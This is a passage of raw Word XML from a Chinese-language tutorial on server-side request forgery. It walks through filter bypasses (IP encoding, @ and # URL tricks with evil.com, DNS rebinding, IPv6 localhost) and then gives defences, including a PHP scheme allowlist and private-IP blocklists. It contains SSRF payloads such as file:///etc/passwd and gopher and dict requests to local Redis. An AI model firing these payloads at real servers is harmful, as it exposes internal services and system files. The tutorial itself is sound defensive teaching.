    <w:p w14:paraId="2324C402" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>内网</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:t>变形示例：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54805219" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>192.168.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>0.1  -&gt;  0xC0A80001  -&gt;  3232235521</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59DA6CF6" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>10.0.0.1     -&gt;  0x0A000001  -&gt;  167772161</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B92F814" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7.2 </w:t>
      </w:r>
      <w:r>
        <w:t>域名解析绕过</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4043E185" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>如果过滤的是</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IPv4 </w:t>
      </w:r>
      <w:r>
        <w:t>地址，用域名绕过：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072F8562" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>xip.io</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">127.0.0.1.xip.io -&gt; </w:t>
      </w:r>
      <w:r>
        <w:t>解析到</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="451CC0D1" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>nip.io</w:t>
      </w:r>
      <w:r>
        <w:t>：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">127.0.0.1.nip.io -&gt; </w:t>
      </w:r>
      <w:r>
        <w:t>解析到</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1DDEF3" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>sslip.io</w:t>
      </w:r>
      <w:r>
        <w:t>：类似</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> xip.io </w:t>
      </w:r>
      <w:r>
        <w:t>的替代服务</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43FF05FD" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>自建域名</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DNS </w:t>
      </w:r>
      <w:r>
        <w:t>指向内网</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IP</w:t>
      </w:r>
      <w:r>
        <w:t>（如</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> attacker.com -&gt; 12</w:t>
      </w:r>
      <w:r>
        <w:t>7.0.0.1</w:t>
      </w:r>
      <w:r>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2995A28A" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7.3 URL </w:t>
      </w:r>
      <w:r>
        <w:t>解析绕过</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8943A0" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve">@ </w:t>
      </w:r>
      <w:r>
        <w:t>符号绕过：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68F43381" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://www.baidu.com@127.0.0.1/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B68C8BB" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>部分</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> WAF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>只检查</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> @ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>前面的域名（认为这是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> baidu.com</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>），实际请求发到了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> 127.0.0.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE9AB36" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>号绕过</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="085A2B6F" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://evil.com#@127.0.0.1/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0640FBB2" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>后面的内容在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>解析时被忽略。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0604A240" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>子域名绕过</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AD128C5" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://127.0.0.1.evil.com/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4515FE42" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 DNS Rebinding</w:t>
      </w:r>
      <w:r>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">DNS </w:t>
      </w:r>
      <w:r>
        <w:t>重绑定）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C80B01" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>原理：利用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DNS </w:t>
      </w:r>
      <w:r>
        <w:t>解析的时间差绕过</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:t>黑名单。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="505B2E2F" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:t>第一次</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DNS </w:t>
      </w:r>
      <w:r>
        <w:t>解析</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> -&gt; </w:t>
      </w:r>
      <w:r>
        <w:t>返回外网</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> IP</w:t>
      </w:r>
      <w:r>
        <w:t>（通过黑名单校验）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55078EA0" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务器校验通过后，发起实际请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF769E4" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>第二次</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> DNS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>查询</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> -&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>攻击</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>者快速</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>更换</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> DNS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>解析，改为内网</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37A61A88" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>请求最终到达内网目标</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A54B0EA" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>条件：攻击者控制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> DNS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务器</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> + TTL=0 + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>服务</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>端没有</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>二次校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E13F539" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C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7.5 IPv6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>绕过</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB35B0D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>部分站点只过滤了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> IPv4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>的内网地址段，忽略了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> IPv6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B90FA3" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>[::</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>1]:80/           # IPv6 localhost</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7399BB40" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://[0:0:0:0:0:ff</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ff:7f00:1]/  # IPv4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>映射</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>IPv6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB17AB0" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">7.6 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>协议切换</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12BC9645" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>如果只限制了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> http/https</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>，可以尝试其他协议：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DD90EF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>=dict://127.0.0.1:6379/info</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0DFFAF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=file:///etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4616B4C4" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?url=gopher://127.0.0.1:6379/_...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70219506" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:t>八、</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">SSRF </w:t>
      </w:r>
      <w:r>
        <w:t>防御方案</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="535EEE81" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>防御</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> SSRF </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>需要从应用层和网络层同时入手，多层防御才安全。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF0B748" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C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协议限制（应用层）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB43EFD" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>只允许</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> http </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> https </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>协议，禁用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> file://</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>dict://</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>gopher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">:// </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>等危险协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E1573D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>代码示例（</w:t>
      </w:r>
      <w:r>
        <w:t>PHP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24DC8525" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>$scheme = parse_url($url, PHP_URL_SCHEME);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AECA8F2" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>if (!in_array($scheme, ["http", "https"])) { die("</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>协议不允许</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>"); }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="241A10DA" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.2 IP </w:t>
      </w:r>
      <w:r>
        <w:t>黑名单（应用层）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="170532DF" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>必须拦截的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>段：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D7D46EA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>10.0.0.0/8         # A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>类内网</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1657CD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>172.16.0.0/12      # B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>类内网</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16331051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>192.168.0.0/16     # C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>类内网</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4005B9C9" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C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 xml:space="preserve">127.0.0.0/8        # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>本机回环</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36B51D00" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve">0.0.0.0/8          # </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>当前网络</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5D265FB1" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">169.254.0.0/16     # </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>云</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>AWS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2431E936" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:r>
        <w:rPr>
